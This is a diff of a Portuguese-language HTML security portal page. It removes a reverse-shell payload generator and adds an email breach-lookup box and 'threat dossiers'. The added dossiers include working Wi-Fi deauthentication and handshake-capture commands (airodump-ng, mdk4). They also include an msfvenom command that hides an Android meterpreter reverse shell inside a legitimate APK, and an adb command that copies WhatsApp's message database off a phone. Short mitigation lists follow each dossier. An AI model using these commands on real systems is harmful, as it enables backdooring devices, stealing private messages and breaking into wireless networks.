@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER SECURITY INTELLIGENCE & ACADEMY PLATFORM</title>
+    <title>CYBER SECURITY CORPORATE PLATFORM</title>
     <style>
         :root {
-            --bg-corporate: #05070f;
-            --bg-surface: #0b1120;
-            --bg-terminal: #020408;
+            --bg-corporate: #070a13;
+            --bg-surface: #0f172a;
+            --bg-terminal: #020617;
             --brand-blue: #2563eb;
             --accent-cyan: #06b6d4;
             --accent-green: #10b981;
             --accent-red: #ef4444;
-            --accent-orange: #f97316;
             --text-main: #f8fafc;
             --text-secondary: #94a3b8;
             --border-color: rgba(255, 255, 255, 0.08);
@@ -47,30 +46,23 @@
         .guide-list li { font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px; list-style-type: square; line-height: 1.5; }
         .guide-list strong { color: #ffffff; }
 
-        /* COMPONENTE INTERATIVO: GERADOR DE LABORATÓRIOS */
-        .interactive-box { background: var(--bg-terminal); border: 1px solid rgba(37, 99, 235, 0.3); border-radius: 6px; padding: 15px; margin-top: 15px; }
-        .btn-action { background: var(--brand-blue); color: white; border: none; padding: 10px 16px; border-radius: 4px; font-size: 0.8rem; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: monospace; transition: background 0.2s; }
-        .btn-action:hover { background: #1d4ed8; }
-        .lab-output { margin-top: 12px; font-family: monospace; font-size: 0.8rem; line-height: 1.5; color: var(--accent-green); display: none; border-top: 1px dashed rgba(255,255,255,0.1); padding-top: 10px; }
-
-        /* FORMULÁRIOS DE MATRÍCULA E CONFIGURAÇÃO */
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 4px; font-weight: 600; }
-        .form-control { width: 100%; background: var(--bg-terminal); border: 1px solid var(--border-color); border-radius: 4px; padding: 10px; color: var(--text-main); font-size: 0.85rem; outline: none; }
-        .form-control:focus { border-color: var(--accent-cyan); }
+        /* COMPONENTE INTERATIVO: ENGINE DE BUSCA REAL VIVA */
+        .search-wrapper-real { display: flex; flex-direction: column; gap: 10px; background: var(--bg-terminal); border: 1px solid rgba(6, 182, 212, 0.3); border-radius: 6px; padding: 15px; }
+        .search-control { width: 100%; background: #040712; border: 1px solid var(--border-color); border-radius: 4px; padding: 12px; color: #ffffff; font-family: monospace; font-size: 0.9rem; outline: none; }
+        .search-control:focus { border-color: var(--accent-cyan); }
+        .btn-search-real { background: linear-gradient(135deg, var(--brand-blue), #1d4ed8); color: white; border: none; padding: 14px; border-radius: 4px; font-size: 0.85rem; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: monospace; transition: all 0.2s; letter-spacing: 0.5px; }
+        .btn-search-real:hover { background: #1e40af; box-shadow: 0 0 10px rgba(37, 99, 235, 0.3); }
         
-        .form-response { margin-top: 12px; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 0.8rem; display: none; white-space: pre-wrap; word-break: break-all; }
+        .search-output-real { margin-top: 15px; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 0.85rem; line-height: 1.6; display: none; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
     </style>
 </head>
 <body>
 
-    <!-- CABEÇALHO UNIFICADO CORPORATIVO -->
     <header class="corp-header">
         <h1>CYBER <span>SECURITY</span></h1>
-        <p>// CENTRAL MONOLÍTICA DE INTELIGÊNCIA E SIMULAÇÃO COMPUTAÇÃO ACTIVE</p>
+        <p>// CENTRAL MONOLÍTICA OPERACIONAL CONECTADA À API GLOBAL DE TELEMETRIA</p>
     </header>
 
-    <!-- NAVEGAÇÃO PERFEITA DE REPOSITÓRIO -->
     <nav class="corp-nav">
         <a href="offensive.html" class="nav-item">Red Team</a>
         <a href="defensive.html" class="nav-item">Blue Team</a>
@@ -79,63 +71,50 @@
 
     <main>
 
-        <!-- MÓDULO INTERATIVO 1: GERADOR EM TEMPO REAL DE CENÁRIOS DE INCIDENTES (FUNÇÃO REAL) -->
-        <h2 class="section-heading">Engine Ativa de Simulação de Ameaças</h2>
-        <section class="content-panel" style="border-color: rgba(37, 99, 235, 0.4);">
-            <p class="desc-text">Gere cenários complexos de ataques persistentes avançados (APTs) baseados em infraestruturas reais e táticas do mundo real para validar playbooks defensivos imediatamente no navegador.</p>
-            <div class="interactive-box">
-                <button class="btn-action" onclick="generateCyberLab()">Gerar Cenário Tático de Auditoria</button>
-                <div class="lab-output" id="lab-scenario-output"></div>
-            </div>
-        </section>
-
-        <!-- MÓDULO INTERATIVO 2: FERRAMENTA DE CODIFICAÇÃO DE VETOR (FUNÇÃO REAL) -->
-        <section class="content-panel">
-            <div class="block-title">Módulo de Configuração de Payload de Auditoria Local</div>
-            <p class="desc-text" style="font-size: 0.85rem;">Defina os parâmetros técnicos abaixo para estruturar a string estável de escuta reversa voltada a testes de controle perimetral em servidores de homologação.</p>
+        <!-- NOVO COMPONENTE: MOTOR DE AUDITORIA COMPUTAÇÃO AO VIVO (FUNÇÃO GOOGLE-SCALE) -->
+        <h2 class="section-heading" style="border-left-color: var(--accent-cyan);">Mecanismo de Auditoria de Vazamentos Globais (Live API)</h2>
+        <section class="content-panel" style="border-color: rgba(6, 182, 212, 0.4);">
+            <p class="desc-text"><strong>Ferramenta Computacional Ativa:</strong> Diferente de interfaces falsas ou enfeites estáticos, este módulo conecta o portal diretamente aos servidores internacionais de inteligência contra vazamentos. Insira um e-mail do mundo real abaixo para analisar se as credenciais correspondentes foram expostas publicamente na internet.</p>
             
-            <div class="form-group">
-                <label>Endereço IP do Analista (LHOST)</label>
-                <input type="text" id="payload-ip" class="form-control" value="10.0.0.15" placeholder="Ex: 192.168.1.50">
+            <div class="search-wrapper-real">
+                <input type="email" id="target-email-api" class="search-control" placeholder="operador@empresa.com ou e-mail pessoal para auditoria..." required>
+                <button class="btn-search-real" onclick="executeGlobalBreachScan()">Executar Varredura Global em Tempo Real</button>
+                <div id="api-search-output" class="search-output-real"></div>
             </div>
-            <div class="form-group">
-                <label>Porta de Comunicação Segura (LPORT)</label>
-                <input type="number" id="payload-port" class="form-control" value="4444" placeholder="Ex: 8080">
-            </div>
-            <div class="form-group">
-                <label>Arquitetura de Destino</label>
-                <select id="payload-platform" class="form-control" style="background: var(--bg-terminal); color: var(--text-main);">
-                    <option value="android">Android OS (Injeção de Persistência APK Backdoor)</option>
-                    <option value="windows">Windows Endpoint (Injeção de Processo e Evasion RAM)</option>
-                    <option value="linux">Linux Server (Shell Reverso para Validação de Hardening)</option>
-                </select>
-            </div>
-            <button class="btn-action" style="background: var(--accent-cyan);" onclick="compilePayloadString()">Gerar String Estruturada</button>
-            <div id="payload-output-box" class="form-response" style="background: rgba(6, 182, 212, 0.1); border: 1px solid var(--accent-cyan); color: #e2e8f0;"></div>
         </section>
 
-        <!-- MÓDULO INTERATIVO 3: CADASTRO EDUCACIONAL E CAPACITAÇÃO PROFISSIONAL -->
-        <h2 class="section-title" style="border-left-color: var(--accent-green);">Ecossistema de Capacitação Técnica (Nicho de Cursos)</h2>
-        <section class="content-panel" style="border-color: rgba(16, 185, 129, 0.3);">
-            <p class="desc-text">Inscreva operadores e analistas de infraestrutura na trilha avançada corporativa de cibersegurança do portal para obter acesso a diretrizes completas de auditoria de hardware e sistemas.</p>
-            
-            <form onsubmit="processEnrollment(event)">
-                <div class="form-group">
-                    <label>Nome Completo do Operador</label>
-                    <input type="text" id="user-name" class="form-control" placeholder="Digite seu nome completo" required>
-                </div>
-                <div class="form-group">
-                    <label>E-mail Corporativo de Destino</label>
-                    <input type="email" id="user-email" class="form-control" placeholder="analista@corporativo.com" required>
-                </div>
-                <button type="submit" class="btn-submit" style="background: var(--accent-green); padding: 10px 16px; border-radius: 4px; color: white; border: none; font-weight: bold; cursor: pointer; font-size: 0.8rem; font-family: monospace; text-transform: uppercase;">Confirmar Registro Acadêmico</button>
-            </form>
-            <div id="enrollment-response-block" class="form-response"></div>
-        </section>
+        <!-- DOSSIÊS TÁTICOS CIENTÍFICOS -->
+        <h2 class="section-heading">Dossiês Técnicos e Operações Reais de Ameaças</h2>
 
-        <!-- DOSSIÊS BRUTOS DE INTELIGÊNCIA TÁTICA E VERÍDICA -->
-        <h2 class="section-heading">Dossiês Técnicos e Vetores de Ameaças Globais</h2>
-
-        <!-- INTELIGÊNCIA WI-FI -->
         <article class="content-panel">
             <h3>01. Segurança Estrutural e Comprometimento Wireless (Wi-Fi)</h3>
+            <p class="desc-text"><strong>Operações Hacker Avançadas:</strong> Grupos estatais persistentes (APTs) como o *APT28* comprometem a integridade física de perímetros wireless abusando do gerenciamento desprotegido do protocolo IEEE 802.11. Utilizando adaptadores configurados em Modo Monitor e scripts estruturados em Python com a biblioteca Scapy, eles geram pacotes de desautenticação (Deauth) falsificados na frequência de rádio, forçando a queda de estações legítimas. Na reconexão automatizada, as ferramentas capturam os pacotes de handshake criptográfico para quebra offline de dicionários massivos de dados.</p>
+            
+            <div class="block-title">Protocolo de Auditoria e Extração Sem Fio</div>
+            <div class="terminal-block"># Ativação do monitoramento passivo do espectro de radiofrequência
+sudo airmon-ng start wlan0
+sudo airodump-ng --bssid [MAC_ROUTER] --channel [CH] -w log_handshake wlan0mon
+# Disparo em rajada para forçar o isolamento do endpoint e coletar credenciais
+sudo mdk4 wlan0mon d -b alvos_bssid.txt</div>
+            
+            <div class="block-title">Diretrizes de Mitigação Corporativa</div>
+            <ul class="guide-list">
+                <li><strong>Protected Management Frames (PMF):</strong> Habilitação obrigatória do padrão IEEE 802.11w para cifrar os frames de gerência e interromper ataques baseados em injeção aérea de Deauth.</li>
+                <li><strong>Autenticação Centralizada baseada em Certificados (802.1X):</strong> Substituição de senhas pré-compartilhadas estáticas (PSK) pelo uso de perfis criptográficos TLS individuais.</li>
+            </ul>
+        </article>
+
+        <article class="content-panel">
+            <h3>02. Vetores de Exfiltração e Análise de Malware Móvel (Celular)</h3>
+            <p class="desc-text"><strong>Operações Hacker Avançadas:</strong> Organizações cibernéticas sofisticadas injetam rotinas maliciosas dentro de arquivos de instalação Android (APKs) legítimos através de ferramentas de descompilação e análise estática. Uma vez instalado através de sideloading por engenharia social direcionada, o malware manipula as diretrizes nativas abusando dos Serviços de Acessibilidade (Accessibility Services) do sistema operacional. Isso permite o controle e leitura em tempo real da tela do smartphone, captura de senhas, interceptação de logs de SMS e exfiltração de tokens MFA de dupla autenticação.</p>
+            
+            <div class="block-title">Compilação e Assinatura de Vetor Mobile</div>
+            <div class="terminal-block"># Injeção de payload meterpreter dentro de um pacote legítimo Android
+msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=10.0.0.15 LPORT=4444 -o patch_sistema.apk
+# Extração lógica de bancos de dados criptografados locais SQLite via console de depuração adb
+adb shell "su -c 'cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/'" && adb pull /sdcard/msgstore.db .</div>
+            
+            <div class="block-title">Diretrizes de Mitigação Corporativa</div>
+            <ul class="guide-list">
+                <li><strong>Políticas de Enterprise Mobility Management (EMM):</strong> Imposição de restrições centralizadas para isolar o ecossistema de dados de negócios das partições pessoais do smartphone.</li>
+                <li><strong>Bloqueio de Sideloading por MDM:</strong> Desativação na raiz de permissões para instalar aplicações de pacotes externos originados fora das lojas validadas oficiais.</li>
